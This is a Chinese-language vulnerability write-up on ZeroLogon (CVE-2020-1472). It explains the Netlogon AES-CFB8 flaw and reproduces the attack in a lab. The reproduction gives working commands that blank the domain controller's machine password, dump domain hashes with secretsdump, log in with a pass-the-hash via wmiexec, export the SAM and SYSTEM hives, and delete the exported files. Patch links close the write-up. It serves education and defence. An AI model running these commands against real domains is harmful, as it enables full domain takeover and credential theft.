@@ -1,0 +1,259 @@
+### **0x01漏洞简介**
+
+CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，此漏洞是微软8月份发布安全公告披露的紧急漏洞，CVSS评分为10分。未经身份认证的攻击者可通过使用
+Netlogon 远程协议（MS-NRPC）连接域控制器来利用此漏洞，成功利用此漏洞的攻击者可获得域管理员权限。该漏洞由 Secura 公司的 Tom
+Tervoort 发现提交并命名为 ZeroLogon。
+
+### 0x02影响范围
+
+ **Windows受影响版本：**
+
+Windows Server 2008 R2 for x64-based Systems Service Pack 1  
+Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core
+installation)  
+Windows Server 2012  
+Windows Server 2012 (Server Core installation)  
+Windows Server 2012 R2  
+Windows Server 2012 R2 (Server Core installation)  
+Windows Server 2016  
+Windows Server 2016 (Server Core installation)  
+Windows Server 2019  
+Windows Server 2019 (Server Core installation)  
+Windows Server, version 1903 (Server Core installation)  
+Windows Server, version 1909 (Server Core installation)  
+Windows Server, version 2004 (Server Core installation)
+
+ **Samba受影响版本：**
+
+4.0 < Samba < 4.8 且 未配置 server schannel = yes
+
+Samba > 4.0 且 Smb.conf配置文件中配置了server schannel = no或server schannel = auto
+
+### 0x03 漏洞分析
+
+ **Netlogon协议是微软提供的一套域访问认证协议，过程如下图：**
+
+![](https://image.3001.net/images/20210126/1611639989_600facb5f3d50a9dcd5c9.png!small)
+
+Client challenge:8字节，攻击者可控，且全部设置为00
+
+Server challenge:8字节，攻击者不可控，但是可以多次发起连接，重新生成server challenge
+
+secret:用户密码的hash
+
+challenges: Client challenge+ Server challenge
+
+Session key:AES加密的密钥，由secret与challenges生成
+
+Client credential:8字节，由session key与client challenge加密运算生成
+
+加密方式是AES-CFB8，AES-CFB8对明文的每个字节进行加密，首先由16个字节的初始化向量（IV）作为输入进行AES运算得到一个输出，取输出的第一个字节，与明文的第一个字节进行异或，得到第一个字节的密文。
+
+第二步，由后15个字节的IV加1个字节的密文作为输入进行AES运算得到一个输出，取输出的第一个字节与明文的第二个字节进行异或，得到第二个字节的密文，以此类推，可得到8个字节的密文作为Client
+credential。
+
+ **其运算过程如下图：**
+
+![1611640103_600fad2779316fba34fec.png!small?1611640102868](https://image.3001.net/images/20210126/1611640103_600fad2779316fba34fec.png!small?1611640102868)
+
+黄色部分为16字节的初始向量IV,
+理论上为了保证AES算法的可靠性该部分内容应该随机生成，而微软却错误的将其全部设置为00；蓝色部分为明文，对应client
+challenge,该部分内容攻击者可控，设置为全00，那么整个AES运算过程如下图所示：
+
+![1611640146_600fad52b339a7a053c0e.png!small?1611640146619](https://image.3001.net/images/20210126/1611640146_600fad52b339a7a053c0e.png!small?1611640146619)
+
+由上图可知，如果第一步的AES运算输出的第一个字节为00，那么得到的第一个字节密文也为00，并且由于后续AES的输入全为00，密钥不变，所以AES输出的第一个字节还是00，密文也还是00，结果就可以得到8个字节全为00的密文作为Client
+credential。
+
+那么如何让AES运算输出第一个字节为00呢？输入全为00，密钥不同，其输出就会不同，改变密钥，那么其输出就会改变。已知Session
+key为AES的密钥，session key由secret与challenges生成，secret与client
+challenge不变，所以只要改变server challenge就会密钥的值，从而改变AES输出的值。
+
+攻击者可以不断发起新的连接，server端就会生成新的server
+challenge，直到AES输出的第一个字节为00，那么攻击者就可以使用8个字节全为00的Client
+credential完成域身份认证。理论上平均2^8=256次碰撞可以得到AES输出的第一个字节为00。
+
+在整个碰撞过程中session key一直是未知的，攻击者可以通过设置flag使之后的过程不使用session key进行加密。
+
+执行每个操作的调用都必须包含验证值，攻击者可以通过提供一个全零验证和一个全零时间戳来绕过。
+
+攻击者可以利用NetrServerPasswordSet2调用更新密码，在该远程调用的过程中会发送新密码的密文，长度为516比特，后四bit表示密码长度，该密文是由session
+key加密的，同理设置为全0，根据上面的session
+key加密算法其真实的密码的明文也是0并且长度为0，这样就置空了server密码。攻击者使用impacket的secretdump，可以dump域内用户hash，包括域控管理员以及krbtgt。
+
+ **攻击者流程图：**
+
+![1611640191_600fad7f1f5f41a4ee65c.png!small?1611640190481](https://image.3001.net/images/20210126/1611640191_600fad7f1f5f41a4ee65c.png!small?1611640190481)
+
+### 0x04 漏洞复现
+
+  * 复现环境
+
+域控:Windows Server 2012 R2
+
+域成员：Windows 7
+
+攻击机：kali
+
+  * 工具准备
+
+漏洞测试工具：zerologon_tester
+
+https://github.com/SecuraBV/CVE-2020-1472
+
+漏洞利用工具：zerologon
+
+https://github.com/risksense/zerologon
+
+网络协议工具：impacket
+
+https://github.com/SecureAuthCorp/impacket
+
+  * 确定域控主机名及IP
+
+在获取到一台域成员系统权限后，收集域控主机名及IP信息。
+
+    
+    
+    ipconfig /all
+
+![1611640283_600faddb186cc3b502a15.png!small?1611640282545](https://image.3001.net/images/20210126/1611640283_600faddb186cc3b502a15.png!small?1611640282545)
+
+    
+    
+    net user /domain
+
+![1611640311_600fadf714ed90b74002f.png!small?1611640310446](https://image.3001.net/images/20210126/1611640311_600fadf714ed90b74002f.png!small?1611640310446)
+
+    
+    
+    ping DC
+
+![1611640325_600fae05d82bf6d18e92d.png!small?1611640325263](https://image.3001.net/images/20210126/1611640325_600fae05d82bf6d18e92d.png!small?1611640325263)
+
+  
+
+  * 测试域控是否存在漏洞  
+
+    
+    
+    python3 zerologon_tester.py DC 192.168.1.53
+
+![1611640365_600fae2dbd037404e66b7.png!small?1611640365099](https://image.3001.net/images/20210126/1611640365_600fae2dbd037404e66b7.png!small?1611640365099)
+
+  * 使用漏洞利用工具置空域控机器账户的密码。（这一步可能会导致域控脱域，需要及时恢复域控机器用户hash）
+
+    
+    
+    python3 set_empty_pw.py DC 192.168.1.53
+
+![1611640386_600fae42ccb3884027a1e.png!small?1611640386314](https://image.3001.net/images/20210126/1611640386_600fae42ccb3884027a1e.png!small?1611640386314)
+
+  * 使用空密码dump域控上的hash
+
+    
+    
+    python3 secretsdump.py troila.com/dc\$@192.168.1.53 –no-pass
+
+![1611640410_600fae5a8c6871b91dcc5.png!small?1611640409987](https://image.3001.net/images/20210126/1611640410_600fae5a8c6871b91dcc5.png!small?1611640409987)
+
+获得administrator的hash后可以尝试破解，得到明文密码
+
+![1611640424_600fae6840ea447267b08.png!small?1611640423635](https://image.3001.net/images/20210126/1611640424_600fae6840ea447267b08.png!small?1611640423635)
+
+  * 通过wmiexec使用administrator的hash获取域管权限
+
+    
+    
+    python3 wmiexec.py –hashes aad3b435b51404eeaad3b435b51404ee:34823259805a88a95e921f4f7e053334 administrator@192.168.1.53
+
+![1611640440_600fae78105f5a5df62ef.png!small?1611640439465](https://image.3001.net/images/20210126/1611640440_600fae78105f5a5df62ef.png!small?1611640439465)
+
+  * 获取目标原始hash
+
+在域控主机上从注册表导出hash文件
+
+    
+    
+    reg save HKLM\SYSTEM system.save
+    reg save HKLM\SAM sam.save
+    reg save HKLM\SECURITY security.save
+
+![1611640460_600fae8ccf2d67703e269.png!small?1611640460207](https://image.3001.net/images/20210126/1611640460_600fae8ccf2d67703e269.png!small?1611640460207)
+
+将导出的hash文件下载到本地
+
+    
+    
+    get system.save
+    get sam.save
+    get security.save
+
+![1611640477_600fae9da85df298a7d74.png!small?1611640476974](https://image.3001.net/images/20210126/1611640477_600fae9da85df298a7d74.png!small?1611640476974)
+
+在域控主机上删除导出的hash文件
+
+    
+    
+    del /f system.save
+    del /f sam.save
+    del /f security.save
+
+![1611640493_600faeade029cad2052f0.png!small?1611640493232](https://image.3001.net/images/20210126/1611640493_600faeade029cad2052f0.png!small?1611640493232)
+
+使用secretsdump读取下载到本地的hash文件,获取域控机器账户置空前的原始hash。
+
+    
+    
+    python3 secretsdump.py –sam sam.save –system system.save –security security.save LOCAL
+
+![1611640506_600faeba934ae88a1a12a.png!small?1611640505937](https://image.3001.net/images/20210126/1611640506_600faeba934ae88a1a12a.png!small?1611640505937)
+
+  * 还原域控机器账户hash
+
+    
+    
+    python3 reinstall_original_pw.py DC 192.168.1.53 9c0dbc4f157d628d3c618e4290c077f4
+
+![1611640524_600faecc327a150bffd73.png!small?1611640523526](https://image.3001.net/images/20210126/1611640524_600faecc327a150bffd73.png!small?1611640523526)
+
+  * 验证hash是否还原
+
+使用空密码连接，连接失败
+
+![1611640543_600faedf0358b05a9b044.png!small?1611640542297](https://image.3001.net/images/20210126/1611640543_600faedf0358b05a9b044.png!small?1611640542297)
+
+使用administrator查看域控机器账户密码hash,已还原
+
+![1611640561_600faef10ac350289b8ef.png!small?1611640561998](https://image.3001.net/images/20210126/1611640561_600faef10ac350289b8ef.png!small?1611640561998)
+
+### 0x05 漏洞修复
+
+ **Windows：**
+
+https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1472
+
+ **Samba：**
+
+https://www.samba.org/samba/history/security.html
+
+  
+
+  
+
+  
+
+  
+
+  
+
+参考链接：
+
+https://www.secura.com/blog/zero-logon
+
+https://www.anquanke.com/post/id/219374
+
+  
+
+![1611642261_600fb595ac669a004bf6f.jpg!small?1611642261078](https://image.3001.net/images/20210126/1611642261_600fb595ac669a004bf6f.jpg!small?1611642261078)
+
